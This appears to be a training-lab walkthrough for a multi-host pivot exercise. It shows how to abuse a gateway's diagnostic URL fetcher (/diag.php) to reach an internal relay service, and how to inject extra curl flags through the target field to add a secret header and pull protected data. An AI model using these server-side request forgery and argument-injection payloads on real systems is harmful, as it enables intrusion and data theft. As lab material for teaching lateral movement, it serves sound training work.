# Multi Host Pivot Lab Walkthrough

## Goal

Compromise the exposed gateway, discover the private relay host, and perform a second relay step to recover protected internal data.

## Expected path

1. Enumerate the exposed gateway:

- `/diag.php`
- `/debug/`
- `robots.txt`

2. Notice that the diagnostic feature fetches arbitrary URLs from the gateway container.

3. Read `/debug/` or `notes.txt` and infer the internal alias:

```text
ops-relay-cache:8080
```

4. Use the gateway feature to request the internal service:

```text
/diag.php?target=http://ops-relay-cache:8080/inventory
```

5. Notice that the private service does not return the secret directly. It exposes:

- `relay_path=/relay/secret`
- `relay_header=X-Relay-Key`

6. Abuse the gateway diagnostic tool again, this time injecting extra curl flags into the target field:

```text
/diag.php?target=-H "X-Relay-Key: relay-stage-two" http://ops-relay-cache:8080/relay/secret
```

## Learning outcome

- understand segmented exposure
- reach a private service through a compromised intermediary
- chain discovery and relay abuse in a controlled lateral-movement scenario
